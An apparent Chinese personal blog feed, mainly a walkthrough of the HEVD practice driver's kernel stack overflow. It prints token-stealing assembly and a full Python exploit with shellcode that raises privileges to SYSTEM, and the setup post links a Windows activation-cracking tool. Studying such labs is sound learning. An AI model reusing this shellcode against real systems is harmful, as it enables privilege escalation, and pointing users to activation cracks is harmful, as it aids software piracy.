<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>leebeecee</title>
  
  <subtitle>Diary</subtitle>
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-12-06T05:05:24.953Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>yo-lee</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>A TALE OF HEVD</title>
    <link href="http://yoursite.com/2020/12/06/A%20TALE%20OF%20HEVD/"/>
    <id>http://yoursite.com/2020/12/06/A%20TALE%20OF%20HEVD/</id>
    <published>2020-12-05T16:00:00.000Z</published>
    <updated>2020-12-06T05:05:24.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Why-I-start-HEVD"><a href="#Why-I-start-HEVD" class="headerlink" title="Why I start HEVD"></a>Why I start HEVD</h2><p>也许是初生牛犊不怕虎，前些日子去做了一些漏洞的复现。就比如说<code>cve-2018-0986</code>， 在我成功依照exploit的复现时，好奇心驱使着我，在动态调试中找到漏洞触发的具体位置，实现更高级的利用，这对于我而言似乎是一件非常酷的工作。但是使用<code>ollydbg</code>却无论如何也调试不到漏洞出现的位置。询问翁师傅后，翁师傅说也许这是ring0级别的漏洞，当我使用时下最炫酷的调试工具<code>windbg preview</code>的时候，我终于定位到了漏洞的位置，可面对<code>windows kernel</code>复杂的数据结构时，我显得十分无助。最终，翁师傅也为我推荐了一个靶场，也就是这个故事的开始，<font color= 'pink'><code>A tale of HEVD</code></font>。</p><p>如果你也要学习windows内核调试的相关知识，我十分建议你从这里开始。</p><h2 id="Better-late-than-never"><a href="#Better-late-than-never" class="headerlink" title="Better late than never"></a>Better late than never</h2><p>如果要开始内核态调试，我们首先要做的工作就是搭建环境。</p><p>我的实验环境是</p><p>windbg preview + virtualKD + win7 enterprise sp1</p><p>虚拟机的搭建就不过多赘述了, 这里分享大家一个破解windows虚拟机的软件, 因为product key总是会浪费一些不必要的时间</p><p><a href="http://www.yishimei.cn/network/319.html">MicroKMS</a></p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206122740.png" alt="image-20201206122740500"></p><p>对于很多人来讲，搭建环境是一个十分麻烦的事情，每个人的环境都会有所不同。但也许我的环境能给你带来一定的参考。</p><p>很多版本的双机调试环境推荐的都是老版的windbg，但是现在我们有了更好用的windbg preview</p><p>首先从这里安装<code>windbg preview</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1D6_-9Fhig5fnb0wXMikNlQ </span><br><span class="line">提取码：a51v </span><br><span class="line">复制这段内容后打开百度网盘手机App，操作更方便哦</span><br></pre></td></tr></table></figure><p><strong>千万不要从windows应用商店下载windbg preview !</strong></p><p>从应用商店下载之后，当你对windbg文件夹进行操作的时候会需要system权限，当然你可以在属性页面 修改文件权限，但是说不定会不成功或者是带来更多的问题（别问我为什么知道）</p><p>我们当然是下载一个独立包，优雅的加入我们的插件</p><p>其次我们要安装virtualKD</p><p><a href="https://github.com/4d61726b/VirtualKD-Redux">virtualKD</a></p><p>安装好virtualKD之后, 我们根据自己的系统打开virtual目录下的vommon文件,并且开启win7虚拟机.</p><p>具体的搭建环境可以看这里, 已经十分详细( <a href="https://blog.csdn.net/lixiangminghate/article/details/78659646">virtualKD加速windbg双机调试速度</a>), 我就不做过多的赘述了</p><p>最新版的virtualKD已经支持windbg preview了</p><p>我们只需选择对应的目录即可</p><p>当我们搭建成功后, 会是这样</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206124430.png" alt="image-20201206124430543"></p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206124457.png" alt="image-20201206124456988"></p><p>TIPS: 如果你也是和我一样第一次接触到内核调试, 那么建议你一开始就准备好快照</p><p>hevd &amp;&amp; OSRLoader</p><p>这部分内容我建议去观看翁师傅的博客, <a href="https://50u1w4y.github.io/site/HEVD/buildEnv/">HEVD 环境搭建</a></p><p>使用windbg preview是双机调试, 你会感到<font color ='pink'>相见恨晚(Better late than never)</font></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Why-I-start-HEVD&quot;&gt;&lt;a href=&quot;#Why-I-start-HEVD&quot; class=&quot;headerlink&quot; title=&quot;Why I start HEVD&quot;&gt;&lt;/a&gt;Why I start HEVD&lt;/h2&gt;&lt;p&gt;也许是初生牛犊不怕虎，前些日</summary>
      
    
    
    
    <category term="A TALE OF HEVD" scheme="http://yoursite.com/categories/A-TALE-OF-HEVD/"/>
    
    
  </entry>
  
  <entry>
    <title>HEVD栈溢出</title>
    <link href="http://yoursite.com/2020/12/06/HEVD%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2020/12/06/HEVD%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2020-12-05T16:00:00.000Z</published>
    <updated>2020-12-07T13:09:56.238Z</updated>
    
    <content type="html"><![CDATA[<p>相信你已经配好了环境, 如有疑惑欢迎私信我</p><p>建议在进行学习前先观阅/HEVD/Whitepaper目录下的说明文档的前几页.</p><h3 id="大橘观–Driver驱动程序"><a href="#大橘观–Driver驱动程序" class="headerlink" title="大橘观–Driver驱动程序"></a>大橘观–Driver驱动程序</h3><p><font color= 'pink'><strong>这些内容当然不是刚需, 但是如果藉此能令你对于驱动程序的运作机制有一定的了解, 我就十分满足了</strong></font></p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206131428.jpg" alt="teamk_pixabay" style="zoom: 67%;" /><p>在上一章节中, 我们最后一步的操作是通过vs编译出hevd.sys文件并由OsrLoader加载</p><p>那么在进行本章的内容前, 先提一下有关windows驱动的知识.</p><p>到底什么是驱动程序</p><p>描述驱动程序可以通过与<code>dll</code>程序进行比较:</p><p><code>驱动程序Drive</code>与<code>动态链接库dll</code>十分相似. 他具有类似于<code>DLLMAIN</code>的主入口点, 名为<code>DriverEntry</code>.</p><p>不同的是, 当驱动程序被操作系统加载时, <code>DriverEntry</code>仅被调用一次. 但是DLL不同,<code>DLLMAIN</code>被调用的次数取决于有多少应用程序或是线程在使用这个DLL文件</p><p>DLL程序定义了自己的<code>interfaces</code>, 并通过<code>LIB</code>文件导出, 使得应用程序可以进行链接</p><p>通过填充操作系统创建的<code>Driver_OBJECT</code>数据结构, 驱动程序在<code>DriverEntry</code>中导出一组标准的入口点.</p><p>每当将请求定向到设备,  操作系统会查看此数据结构,以获取指向适当功能的指针.</p><p><code>DRIVER_OBJECT</code>是操作系统分配和部分初始化的内存块, 该对象描述了:</p><ol><li>驱动程序代码加载到内存中的位置</li><li>驱动程序的名称</li><li><code>Function Address Pointer</code>, 驱动程序必须填写这些指针以指示驱动程序支持的功能. 并且必须要有一个功能指针称做<code>Function Dispatch Table</code>, 这个分配表为操作系统支持的每一个<code>Major Function Code</code>分配一个入口.  现在驱动程序可以支持28个功能, 但是我们只要记住这8个功能函数即可</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">IRP_MJ_CREATE，</span><br><span class="line"></span><br><span class="line">IRP_MJ_CLOSE，</span><br><span class="line"></span><br><span class="line">IRP_MJ_READ，</span><br><span class="line"></span><br><span class="line">IRP_MJ_WRITE，</span><br><span class="line"></span><br><span class="line">IRP_MJ_PNP，</span><br><span class="line"></span><br><span class="line">IRP_MJ_POWER，</span><br><span class="line"></span><br><span class="line">IRP_MJ_DEVICE_CONTROL</span><br><span class="line"></span><br><span class="line">IRP_MJ_SYSTEM_CONTROL</span><br></pre></td></tr></table></figure><p>每当用户向操作系统请求执行功能时, 操作系统都会选择与该操作对应的功能函数, 并返回相应操作数给用户</p><p>驱动程序创建的<code>DEVICE_OBJECTS</code>对象会描述驱动程序支持的”物理的”或”虚拟的”设备</p><p>这些<code>DEVICE_OBJECT</code>是I / 0请求的目标, 并且DEVICE_OBJECT必须为这些设备创建名称, 以便用户应用程序或其他驱动程序可以<code>OPEN</code>这些设备. </p><p>举个栗子:</p><p>当一个用户应用程序执行CreateFile请求并指定名称<code>Com1</code>时,操作系统会对名为<code>Com1</code>的设备进行<code>open</code>操作</p><p>并向应用程序返回一个<code>HANDLE</code></p><p>驱动程序会处理由以用户态运行的程序发送的请求, 有时也可能会处理来自操作系统中其他驱动程序的请求. </p><ul><li>在用户态下:</li></ul><p>请求将内置到称为<code>IRP</code>的包中</p><p><code>IRP</code>由<strong>I/O管理器和操作系统组件</strong>构建, 并且包含<code>Major Function Code</code>,  这段代码向驱动程序指示应该在设备上执行的操作. 构建<code>IRP</code>之后, I/0管理管理器将通过<code>DRIVER_OBJECT</code>中包含的<code>Function Dispatch Table</code>在其导出的入口点调用驱动程序.</p><ul><li>如果一个驱动程序向另一个驱动程序发送请求时:</li></ul><p>那么另一个的驱动程序负责构建<code>IRP</code>, 并使用操作系统例程将IRP传递给你的驱动程序</p><p>一旦驱动程序收到IRP, 它就有3种关于如何处理这些请求的选项</p><ul><li>立即执行用户请求的操作, 并且立即告诉操作系统IRP已经完成</li><li>保留IRP, 并告诉操作系统IRP处于<code>Pending</code>状态, 稍后进行操作</li><li>驱动程序确定它本身无法处理请求, 并且必须将IRP传递给其他将处理请求的驱动程序</li></ul><p>如果驱动程序正在控制某个实际的物理设备, 则驱动程序负责响应对于该设备的请求</p><p>通常, 这些设备在完成请求操作后, 会发生<code>中断</code>;</p><p>操作系统会为驱动相关的设备注册<code>Interrupt Service Routine(ISR)</code>.</p><p> 当设备在调用相关<code>ISR</code>时, 设备会发生中断. 这是因为<code>ISR</code>负责确定发生的是否是设备中断:</p><ul><li>如果不是设备中断, 则进行返回操作并向操作系统表明该中断未进行处理, 此时操作系统将调用下一个注册的中断管理程序</li><li>如果该中断是针对该设备的, 则ISR必须保存该中断所需的<code>上下文</code>, 最后进行<code>DPC</code>队列中, <code>DPC</code>例程是内核模式回调, 它负责完成<code>IRP</code>(<code>IRP</code>的工作是通过信号中断执行的,并负责声明驱动程序的执行)</li></ul><h3 id="TRY-TO-FIND"><a href="#TRY-TO-FIND" class="headerlink" title="TRY TO FIND"></a>TRY TO FIND</h3><p>要大致的理解一个程序运作的流程, 自然离不开IDA</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153052.png" alt="image-20201206153052617"></p><p>找到IrpDeviceIoCtlHandler之后</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153237.png" alt="image-20201206153237210"></p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153426.png" alt="image-20201206153426470"></p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206165633.png" alt="image-20201206165632969"></p><p> 不难发现<code>switch</code>由IRP相应的数据结构所控制, switch的内容为0x22203,就可以进入栈溢出函数当中</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153627.png" alt="image-20201206153627365"></p><p>发现导致栈溢出的函数, memcpy</p><p>我们进入分析栈结构</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206153719.png" alt="image-20201206153719845"></p><p>使用**’A’ * 0x81C + ‘B’ * 4 + shellcodeaddr **的结构. 我们就可以完成栈溢出利用</p><h3 id="Try-to-meet"><a href="#Try-to-meet" class="headerlink" title="Try to meet"></a>Try to meet</h3><p>在上个部分, 我们已经熟悉了整个驱动程序的运作流程, 以及漏洞发生的位置, 如何去利用这个漏洞. </p><p>但是这些都是静态分析出来的结果, 我们的下一步工作是通过动态调试的方式定位到相应的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes, sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line"><span class="comment"># 0xC0000000 前四位为 1100,等同于GENERIC_READ | GENERIC_WRITE,即读写权限</span></span><br><span class="line"><span class="comment"># 0x3 为 0011,等同于FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,即只读和隐藏属性</span></span><br><span class="line">hevDevice = kernel32.CreateFileA(<span class="string">&quot;\\.\HackSysExtremeVulnerableDriver&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="number">0x3</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hevDevice <span class="keyword">or</span> hevDevice == <span class="number">-1</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;*** Couldn&#x27;t get Device Driver handle.&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x81c</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span> </span><br><span class="line">bufLength = len(buf)</span><br><span class="line"></span><br><span class="line">kernel32.DeviceIoControl(hevDevice, <span class="number">0x222003</span>, buf, bufLength, <span class="literal">None</span>, <span class="number">0</span>, byref(c_ulong()), <span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>emmm, 这里有两个函数比较重要<font color= 'pink'><code>CreateFileA</code></font>以及<font color= 'pink'><code>DeviceIoControl</code></font></p><p>虽然MSDN已经够了, 但是我还是推荐下这篇文章<a href="https://www.cnblogs.com/lsh123/p/6890797.html">CreateFile DeviceIoControl dwIoControlCode——应用程序与驱动程序通信</a></p><p>exp比较简单, 就不过多的赘述</p><p>我们运行demo.py之后</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206160833.png" alt="image-20201206160833004"></p><p>可以看到, 我们已经进入了漏洞函数, 并且之前的DbgPrint也成功的显示了函数中原本的内容</p><p>那么就可以进行漏洞利用了</p><h3 id="目击你刚刚完成这一跳"><a href="#目击你刚刚完成这一跳" class="headerlink" title="目击你刚刚完成这一跳"></a><font color= 'pink'>目击你刚刚完成这一跳</font></h3><p>怎么去利用, 首先想到的就是提权</p><p>在Windows中所有的对象都有安全描述符, 它们定义了在对象上谁可以执行哪些行为. 有很多种<code>tokens</code>用于描述这些访问权限, 但是<code>NT AUTHORITY\SYSTEM</code> 拥有最高权限.</p><p>上面提到</p><p>使用<code>&#39;A&#39; * 0x81C + &#39;B&#39; * 4 + shellcodeaddr</code> 的结构. 我们就可以完成栈溢出利用(这里的’B*4没有什么必要, 只是平时的一个习惯’)</p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206162144.jpg" alt="img" style="zoom:50%;" /><p>在HackSysTeam驱动中内置了一些<code>payload</code>, 其中一个的内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pushad                               ; Save registers state</span><br><span class="line"></span><br><span class="line">; Start of Token Stealing Stub</span><br><span class="line">xor eax, eax                         ; Set ZERO</span><br><span class="line">mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                     ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"></span><br><span class="line">mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"></span><br><span class="line">mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"></span><br><span class="line">mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4</span><br><span class="line"></span><br><span class="line">SearchSystemPID:</span><br><span class="line">    mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">    sub eax, FLINK_OFFSET</span><br><span class="line">    cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">    jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                     ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">popad                                ; Restore registers state</span><br></pre></td></tr></table></figure><p>这里我们已经完成了提权, 但是如果直接运行这段shellcode的话, 你的栈肯定会崩掉,</p><p>回到IDA, 我们去分析一下</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206163932.png" alt="image-20201206163932826"></p><p>我们仍需在这之后进行如下操作以维持堆栈平衡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS -&gt; STATUS_SUCCESS</span><br><span class="line">pop ebp</span><br><span class="line">retn 8</span><br></pre></td></tr></table></figure><p>最终的exploit如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes, sys, struct</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">kernel32 = windll.kernel32</span><br><span class="line"><span class="comment"># 0xC0000000 前四位为 1100,等同于GENERIC_READ | GENERIC_WRITE,即读写权限</span></span><br><span class="line"><span class="comment"># 0x3 为 0011,等同于FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN,即只读和隐藏属性</span></span><br><span class="line">hevDevice = kernel32.CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="number">0x3</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hevDevice <span class="keyword">or</span> hevDevice == <span class="number">-1</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;*** Couldn&#x27;t get Device Driver handle.&quot;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += bytearray(</span><br><span class="line">    <span class="string">&quot;\x60&quot;</span></span><br><span class="line">    <span class="string">&quot;\x64\xA1\x24\x01\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x40\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x89\xC1&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x98\xF8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\x04\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\x80\xB8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2D\xB8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x39\x90\xB4\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x75\xED\x8B\x90\xF8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x89\x91\xF8\x00\x00\x00&quot;</span></span><br><span class="line">    <span class="string">&quot;\x61&quot;</span></span><br><span class="line">    <span class="string">&quot;\x31\xC0&quot;</span></span><br><span class="line">    <span class="string">&quot;\x5D&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC2\x08\x00&quot;</span>             </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ptr = kernel32.VirtualAlloc(c_int(<span class="number">0</span>),c_int(len(shellcode)), c_int(<span class="number">0x3000</span>), c_int(<span class="number">0x40</span>))</span><br><span class="line">buff = (c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))</span><br><span class="line">shelladdr = struct.pack(<span class="string">&quot;&lt;L&quot;</span>, ptr)</span><br><span class="line"><span class="keyword">print</span> shelladdr</span><br><span class="line"></span><br><span class="line">buf = <span class="string">&quot;a&quot;</span> * <span class="number">2080</span> + shelladdr</span><br><span class="line">bufLength = len(buf)</span><br><span class="line"></span><br><span class="line">kernel32.DeviceIoControl(hevDevice, <span class="number">0x222003</span>, buf, bufLength, <span class="literal">None</span>, <span class="number">0</span>, byref(c_ulong()), <span class="literal">None</span>)</span><br><span class="line">Popen(<span class="string">&quot;start cmd&quot;</span>, shell = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>最终结果如下</p><p><img src="https://raw.githubusercontent.com/yoshiki-lee/Pic/master/20201206164429.png" alt="image-20201206164429042"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="道别时想说些什么"><a href="#道别时想说些什么" class="headerlink" title="道别时想说些什么"></a>道别时想说些什么</h3><p>复现这个漏洞的过程中, 我参阅了这些资料</p><p><a href="https://r00tk1ts.github.io/2018/01/06/%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/">Windows exploit系列教程第十部分：内核利用程序之栈溢出</a></p><p><a href="https://50u1w4y.github.io/site/HEVD/stackoverflow/">HEVD栈溢出</a></p><p><a href="http://www.osronline.com/article.cfm%5earticle=233.html">Exactly What is A Driver</a></p><h6 id="近人可读"><a href="#近人可读" class="headerlink" title="近人可读"></a><font color ='pink'>近人可读</font></h6><p>前段时间, 我试着去调试了一些CVE, 最终自然是铩羽而归, 但是也积累了一些也许未来能够用到的东西, 至少是了解了windows相关的一些东西. </p><p>复现这个栈溢出漏洞的过程中, 我也遇到了许多麻烦, 比如我第一次进行提权利用时, 我忘记了要维持栈平衡, 把原因归结为也许是堆栈不可执行, 但是我又对GS, DEP, SEH等概念十分模糊, 自然而然是基础过于薄弱, 于是去翻读了一下”0day2”, 还好自己人菜瘾大, 及时的补上了相关的知识</p><p>当然，这个部分许多东西知识一笔带过，就比如说那段shellcode如何实现的提权，我会单独做个专题来记录</p><p>这个系列用的封面都是腰（寸铁）乐队的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;相信你已经配好了环境, 如有疑惑欢迎私信我&lt;/p&gt;
&lt;p&gt;建议在进行学习前先观阅/HEVD/Whitepaper目录下的说明文档的前几页.&lt;/p&gt;
&lt;h3 id=&quot;大橘观–Driver驱动程序&quot;&gt;&lt;a href=&quot;#大橘观–Driver驱动程序&quot; class=&quot;header</summary>
      
    
    
    
    <category term="A TALE OF HEVD" scheme="http://yoursite.com/categories/A-TALE-OF-HEVD/"/>
    
    
  </entry>
  
  <entry>
    <title>一些琐事</title>
    <link href="http://yoursite.com/2020/10/06/10.6%E6%97%A5%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/06/10.6%E6%97%A5%E8%AE%B0/</id>
    <published>2020-10-06T13:38:03.559Z</published>
    <updated>2020-10-06T14:08:30.389Z</updated>
    
    <content type="html"><![CDATA[<p>​    <font color ="pink"><strong>这里仅记录自己絮絮叨叨且无用的一些话，当作最近的一个出口吧</strong></font></p><p>​    国庆那天就直接去了实验室，但是工作效率并不令人满意。面对面前一大堆没做的东西，也许是贪心想什么都做，但最后什么都没学会。</p><p>​    吴师傅总结我9月的学习历程时提到，除了博客都差强人意。于是不免有些骄傲了，那么后面就紧紧跟着一个大跟头。</p><p>​    之前在学习栈溢出的时候，也犯了一些低级错误。也许是依赖性，并没有仔细的去调试，去用起之前已有的一些基础就去询问吴师傅，师兄当然不会很开心，突然就想起之前当吉他老师的时候，教一些小朋友时自己的一些心理变化。第二日师兄也给我打了20多分钟的电话，我也只听懂了一部分。做二进制这事，吴师傅从来没有用任何的大道理去指导我，只是讲述他自己亲身经历的。电话前我说师兄，我请你抽烟吧，师兄只是提了句，等你工作后拿到第一笔工资给我买条华子就行。</p><p>​     摇旗不定的时候，也问了婉儿姐姐一些东西。</p><p>​     当然做ctf遇到疑惑的时候，同组的师哥以及室友bob也会为我答疑解惑。</p><p>​      <font color= "pink">真的很感谢这些朋友们。有时也会想起吴师傅刚开始学习的时候，可能走了比我更多的弯路，我这些话却又显得过于的矫情。</font></p><pre><code> 这几天近乎都是荒废的状态，没学到太多的东西，硬要解释的话，先走慢点吧。不过明天也应该走快了。</code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;font color =&quot;pink&quot;&gt;&lt;strong&gt;这里仅记录自己絮絮叨叨且无用的一些话，当作最近的一个出口吧&lt;/strong&gt;&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​    国庆那天就直接去了实验室，但是工作效率并不令人满意。面对面前一大堆没做的东西，也许是贪心想什</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>逆向工程核心原理笔记</title>
    <link href="http://yoursite.com/2020/09/23/restudy/"/>
    <id>http://yoursite.com/2020/09/23/restudy/</id>
    <published>2020-09-23T08:45:11.023Z</published>
    <updated>2020-12-06T02:31:18.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向工程核心原理学习笔记"><a href="#逆向工程核心原理学习笔记" class="headerlink" title="逆向工程核心原理学习笔记"></a>逆向工程核心原理学习笔记</h1><p>作者：<a href="yoshiki-lee.github.io">yoshiki-lee</a> </p><p>本专题的目的是为了总结逆向工程核心原理这本书籍一些比较重要的知识点。</p><h3 id="第一部分："><a href="#第一部分：" class="headerlink" title="第一部分："></a>第一部分：</h3><h4 id="汇编指令学习记录"><a href="#汇编指令学习记录" class="headerlink" title="汇编指令学习记录"></a>汇编指令学习记录</h4><h5 id="mov与lea区别"><a href="#mov与lea区别" class="headerlink" title="mov与lea区别"></a>mov与lea区别</h5><p>mov不再过多赘述：</p><p>lea指令介绍：</p><p>lea(load effective address)：意为加载有效地址。</p><p>经常在各种博客当中看到lea和mov的区别，那么怎么将其作区分呢？</p><p>例如mov ax, bx,意为保存bx的值到ax当中</p><p>那么lea ax, bx是什么意思？</p><p>首先，上述指令是非法指令，因为lea第二操作数不加[]是非法的</p><p>之前学习汇编的时候，将常数与常数的指针以t和[t]做区分</p><p>结合lea的意思，且lea ax, [bx]是合法指令的情况下</p><p>mov ax,[bx]的意思是把内存地址为bx中的数据赋给ax</p><p>lea ax, [bx]的意思是直接将bx赋值给ax</p><h4 id="ollydbg的基本使用："><a href="#ollydbg的基本使用：" class="headerlink" title="ollydbg的基本使用："></a>ollydbg的基本使用：</h4><p>待更新</p><h4 id="栈与栈帧："><a href="#栈与栈帧：" class="headerlink" title="栈与栈帧："></a>栈与栈帧：</h4><h5 id="栈："><a href="#栈：" class="headerlink" title="栈："></a>栈：</h5><p>​    栈是一种特殊的数据结构，栈最重要的一个思想就是先进后出。而在8086汇编当中，有两个基本的寄存器与其关联，即SS与sp(这里寄存器统一用16位寄存器)，SS指向栈低，sp指向栈顶，由此我们可以得出结论，栈是CPU寄存器里的ss:sp指向的一片内存区域。</p><p><img src="https://i.loli.net/2020/09/24/8glXavjRhVsbnrU.png" 